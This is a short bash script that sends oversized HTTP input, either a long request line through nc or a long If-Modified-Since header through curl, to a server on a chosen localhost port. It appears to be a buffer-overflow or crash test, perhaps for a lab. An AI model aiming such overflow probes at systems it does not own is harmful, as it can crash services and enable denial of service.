#!/bin/bash

PORT=$1
if [[ -z $PORT ]]
then
        echo "Enter port number to attack: "
        read PORT
fi

N_CHARS=$2
if [[ -z $N_CHARS ]]
then
        echo "Enter number of chars: "
        read N_CHARS
fi

HTTP_REQ="GET"
CHAR='A'
END_REQ="\r\n\r\n"

echo "Would you like to overflow request or header?[req/head]"
read CHOICE

if [[ $CHOICE == "req" ]]
then    
        python3 -c "print('$HTTP_REQ '+'$CHAR'*$N_CHARS+'$END_REQ')" > payload
        nc -q 2 localhost $PORT < payload
elif [[ $CHOICE == "head" ]]
then    
        curl http://localhost:$PORT \
        -H "Host:" \
        -H "User-Agent:" \
        -H "Accept:" \
        -H "If-Modified-Since: $(python3 -c "print('$CHAR'*$N_CHARS+'$END_REQ')")"
else
        echo "Invalid input"
fi
